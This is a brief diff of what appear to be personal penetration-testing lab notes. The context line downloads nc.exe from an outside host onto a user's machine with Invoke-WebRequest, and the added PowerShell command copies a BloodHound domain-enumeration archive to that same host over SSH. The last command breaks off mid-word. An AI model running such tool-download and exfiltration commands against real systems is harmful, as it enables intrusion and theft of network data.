@@ -107,5 +107,9 @@ iwr -uri "http://192.168.45.228:8888/nc.exe" -outfile "C:\Users\joe\Downloads\nc
 
 well had no luck doing this last night, have found some other methods, picking back up
 
+```powershell
+Copy-Item -Path "C:\Users\joe\Downloads\20240101073544_BloodHound.zip" -Destination "home/zell/Documents/20240101073544_BloodHound.zip" -Tosession (New-SSHSession -ComputerName "192.168.45.228") | Remo
+```
+
 
 
